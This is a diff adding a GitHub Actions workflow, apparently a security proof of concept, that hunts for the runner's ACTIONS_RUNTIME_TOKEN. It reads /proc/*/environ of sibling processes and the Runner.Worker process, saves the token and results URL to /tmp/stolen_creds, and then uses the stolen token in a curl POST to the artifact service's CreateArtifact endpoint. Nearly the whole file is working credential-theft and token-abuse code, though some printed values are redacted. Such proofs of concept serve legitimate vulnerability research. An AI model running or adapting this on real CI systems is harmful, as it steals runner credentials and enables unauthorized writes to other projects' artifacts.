@@ -1,0 +1,99 @@
+name: Token Scrape PoC
+on:
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read   # MINIMAL — proves no special perms needed
+
+jobs:
+  scrape:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4   # Node action — gets the token
+
+      - uses: actions/setup-go@v4   # Another Node action — also gets it
+        with:
+          go-version: '1.21'
+
+      - name: Hunt for ACTIONS_RUNTIME_TOKEN via 3 techniques
+        run: |
+          set +e
+          echo "=================================================="
+          echo "TECHNIQUE 1: Scrape /proc/*/environ (sibling env)"
+          echo "=================================================="
+          for pid_dir in /proc/[0-9]*/; do
+            pid=$(basename "$pid_dir")
+            if [ -r "$pid_dir/environ" ]; then
+              found=$(tr '\0' '\n' < "$pid_dir/environ" 2>/dev/null | grep -c "^ACTIONS_RUNTIME_TOKEN=")
+              if [ "$found" -gt 0 ]; then
+                cmd=$(tr '\0' ' ' < "$pid_dir/cmdline" 2>/dev/null | head -c 80)
+                echo "✅ Found in PID $pid ($cmd)"
+                tr '\0' '\n' < "$pid_dir/environ" 2>/dev/null | grep "^ACTIONS_RUNTIME_TOKEN=" | sed 's/=.*/=<JWT_REDACTED>/'
+                tr '\0' '\n' < "$pid_dir/environ" 2>/dev/null | grep "^ACTIONS_RESULTS_URL=" | head -1
+                # Save for next step
+                tr '\0' '\n' < "$pid_dir/environ" 2>/dev/null | grep -E "^(ACTIONS_RUNTIME_TOKEN|ACTIONS_RESULTS_URL)=" >> /tmp/stolen_creds
+                break
+              fi
+            fi
+          done
+          if [ ! -s /tmp/stolen_creds ]; then
+            echo "❌ Nothing found via sibling environ"
+          fi
+          echo ""
+          echo "=================================================="
+          echo "TECHNIQUE 2: Inspect parent Runner.Worker process"
+          echo "=================================================="
+          # Find Runner.Worker process
+          worker_pid=$(pgrep -f "Runner.Worker" | head -1)
+          echo "Runner.Worker PID: $worker_pid"
+          if [ -n "$worker_pid" ]; then
+            echo "Can read /proc/$worker_pid/environ?"
+            ls -la /proc/$worker_pid/environ 2>&1 | head -3
+            tr '\0' '\n' < /proc/$worker_pid/environ 2>/dev/null | grep -E "^(ACTIONS_RUNTIME_TOKEN|ACTIONS_RESULTS_URL)=" | sed 's/=.\{20,\}/=<REDACTED>/' | head -3 || echo "Permission denied"
+            echo ""
+            echo "Can read /proc/$worker_pid/maps?"
+            ls -la /proc/$worker_pid/maps 2>&1 | head -3
+            echo ""
+            echo "Can read /proc/$worker_pid/mem?"
+            ls -la /proc/$worker_pid/mem 2>&1 | head -3
+          fi
+          echo ""
+          echo "=================================================="
+          echo "TECHNIQUE 3: Process tree — what's running?"
+          echo "=================================================="
+          ps auxf 2>&1 | head -40
+          echo ""
+          echo "=================================================="
+          echo "RESULT: Did we capture the token?"
+          echo "=================================================="
+          if [ -s /tmp/stolen_creds ]; then
+            echo "🎯 SUCCESS — token captured for downstream use"
+            wc -l /tmp/stolen_creds
+          else
+            echo "❌ FAILED — no token captured via /proc/*/environ"
+          fi
+
+      - name: Step 2 — try to UPLOAD using stolen token
+        if: always()
+        run: |
+          if [ ! -s /tmp/stolen_creds ]; then
+            echo "No creds to use, skipping upload test"
+            exit 0
+          fi
+          set -e
+          source /tmp/stolen_creds
+          echo "Loaded ACTIONS_RUNTIME_TOKEN length: ${#ACTIONS_RUNTIME_TOKEN}"
+          echo "Loaded ACTIONS_RESULTS_URL: $ACTIONS_RESULTS_URL"
+          echo ""
+          echo "=== Attempting Twirp call: CreateArtifact ==="
+          # Twirp endpoint for v4 artifacts
+          url="${ACTIONS_RESULTS_URL%/}/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
+          payload='{"workflow_run_backend_id":"00000000-0000-0000-0000-000000000000","workflow_job_run_backend_id":"00000000-0000-0000-0000-000000000000","name":"poc-stolen-via-scrape","version":4}'
+          response=$(curl -sS -X POST -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            -H "Content-Type: application/json" \
+            -d "$payload" \
+            "$url" 2>&1)
+          echo "Response (first 300 chars):"
+          echo "$response" | head -c 300
+          echo ""
